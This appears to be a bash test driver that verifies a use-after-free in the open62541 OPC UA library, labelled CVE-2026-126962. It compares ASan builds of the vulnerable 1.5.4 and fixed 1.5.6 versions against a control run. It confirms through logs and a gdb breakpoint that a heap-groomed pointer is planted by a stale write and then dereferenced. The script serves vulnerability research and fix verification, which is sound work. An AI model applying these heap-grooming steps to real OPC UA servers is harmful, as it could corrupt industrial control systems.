#!/bin/bash
# Rung-4 downstream dereference probe for CVE-2026-126962.
# Usage: bash run.sh <outdir> && bash deref.sh <outdir>
# Requires the ASan build trees produced by run.sh in <outdir>/1.5.4 and /1.5.6.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
OUT="$(realpath -m "${1:?usage: deref.sh <outdir>}")"
mkdir -p "$OUT/deref"
: > "$OUT/deref/pass.log"
p(){ echo "PASS $1" | tee -a "$OUT/deref/pass.log"; }
f(){ echo "FAIL $1" | tee -a "$OUT/deref/pass.log"; exit 1; }
command -v gdb >/dev/null || f 'gdb is required for the frame check'

for v in 1.5.4 1.5.6; do
  T="$OUT/$v"
  [ -f "$T/out-asan/bin/libopen62541.a" ] || f "missing ASan build for $v (run run.sh first)"
  gcc -std=c99 -g -O1 -fsanitize=address -fno-omit-frame-pointer \
    -I"$T/out-asan/src_generated" -I"$T/include" -I"$T/plugins/include" \
    -I"$T/deps" -I"$T/src" -I"$T" -o "$OUT/deref/harness-$v" \
    "$HERE/deref_harness.c" "$T/out-asan/bin/libopen62541.a" -lpthread -lm \
    > "$OUT/deref/build-$v.log" 2>&1 || f "compile failed for $v"
done
p 'deref harness compiled against both pinned ASan builds'

OPTS='detect_leaks=0:quarantine_size_mb=0'
ASAN_OPTIONS="$OPTS" "$OUT/deref/harness-1.5.4" > "$OUT/deref/vuln.log" 2>&1
VRC=$?
ASAN_OPTIONS="$OPTS" OA_SKIP_DELETE=1 "$OUT/deref/harness-1.5.4" > "$OUT/deref/control.log" 2>&1
CRC=$?
ASAN_OPTIONS="$OPTS" "$OUT/deref/harness-1.5.6" > "$OUT/deref/fixed.log" 2>&1
FRC=$?

grep -q 'same_chunk=1' "$OUT/deref/vuln.log" && \
  p 'vulnerable: freed old-subscription chunk reclaimed by live replacement'

VB=$(grep -o 'groomedQueueBefore=[0-9]*' "$OUT/deref/vuln.log" | cut -d= -f2)
VA=$(grep -o 'groomedQueueAfter=[0-9]*' "$OUT/deref/vuln.log" | cut -d= -f2)
CB=$(grep -o 'groomedQueueBefore=[0-9]*' "$OUT/deref/control.log" | cut -d= -f2)
CA=$(grep -o 'groomedQueueAfter=[0-9]*' "$OUT/deref/control.log" | cut -d= -f2)
FB=$(grep -o 'groomedQueueBefore=[0-9]*' "$OUT/deref/fixed.log" | cut -d= -f2)
FA=$(grep -o 'groomedQueueAfter=[0-9]*' "$OUT/deref/fixed.log" | cut -d= -f2)

grep -q 'head_is_groomed=1' "$OUT/deref/vuln.log" && \
  p 'vulnerable: stale write placed the groomed cross-subscription pointer at byte 200'
[ -n "$VB" ] && [ -n "$VA" ] && [ "$VA" -gt "$VB" ] && \
  p "vulnerable: server sampling dereferenced the groomed pointer (queue $VB -> $VA)"
[ "$VRC" -eq 0 ] && p "vulnerable deref run rc=$VRC"

grep -q 'head_is_groomed=0' "$OUT/deref/control.log" && \
  p 'skip-delete control: replacement keeps its own monitored item'
[ -n "$CB" ] && [ -n "$CA" ] && [ "$CA" -eq "$CB" ] && \
  p "skip-delete control: groomed queue $CB -> $CA unchanged"
[ "$CRC" -eq 0 ] && p "skip-delete control rc=$CRC"

grep -q 'head_is_groomed=0' "$OUT/deref/fixed.log" && \
  p 'fixed 1.5.6: replacement keeps its own monitored item'
[ -n "$FB" ] && [ -n "$FA" ] && [ "$FA" -eq "$FB" ] && \
  p "fixed 1.5.6: groomed queue $FB -> $FA unchanged"
[ "$FRC" -eq 0 ] && p "fixed rc=$FRC"

# gdb frame check on the same vulnerable build: the replacement subscription's
# real sampleAndPublishCallback must dereference the groomed pointer.
gdb -q -batch \
  -ex 'set pagination off' \
  -ex "set environment ASAN_OPTIONS $OPTS" \
  -ex 'break ua_subscription.c:1017 if sub->subscriptionId == 2' \
  -ex 'run' \
  -ex 'printf "DEREF sub=%p id=%u mon=%p mon->subscription=%p mon->queueSize=%zu\n", sub, sub->subscriptionId, mon, mon->subscription, mon->queueSize' \
  -ex 'bt 4' \
  --args "$OUT/deref/harness-1.5.4" > "$OUT/deref/gdb-deref.log" 2>&1
GREP=$(grep '^DEREF ' "$OUT/deref/gdb-deref.log" || true)
SUB=$(printf '%s\n' "$GREP" | sed -n 's/.*sub=\(0x[0-9a-f]*\) id=2.*/\1/p')
MON=$(printf '%s\n' "$GREP" | sed -n 's/.*mon=\(0x[0-9a-f]*\) mon->subscription.*/\1/p')
OWNER=$(printf '%s\n' "$GREP" | sed -n 's/.*mon->subscription=\(0x[0-9a-f]*\) mon->queueSize.*/\1/p')
[ -n "$SUB" ] && [ -n "$MON" ] && [ -n "$OWNER" ] && \
  grep -q 'sampleAndPublishCallback .*ua_subscription.c:1017' "$OUT/deref/gdb-deref.log" && \
  p "gdb frame: replacement sub $SUB dereferenced groomed mon $MON (owner $OWNER)"
[ -n "$MON" ] && [ "$MON" != "$OWNER" ] && \
  p 'gdb: groomed mon owner differs from the dereferencing subscription'

if grep -q 'head_is_groomed=1' "$OUT/deref/vuln.log" && \
   [ -n "$VA" ] && [ -n "$VB" ] && [ "$VA" -gt "$VB" ] && \
   [ -n "$CA" ] && [ -n "$CB" ] && [ "$CA" -eq "$CB" ] && \
   [ -n "$FA" ] && [ -n "$FB" ] && [ "$FA" -eq "$FB" ] && \
   [ -n "$MON" ]; then
  p "trace sha256=$(sha256sum "$OUT/deref/pass.log" | cut -d' ' -f1)"
else
  f 'dereference differential not observed'
fi
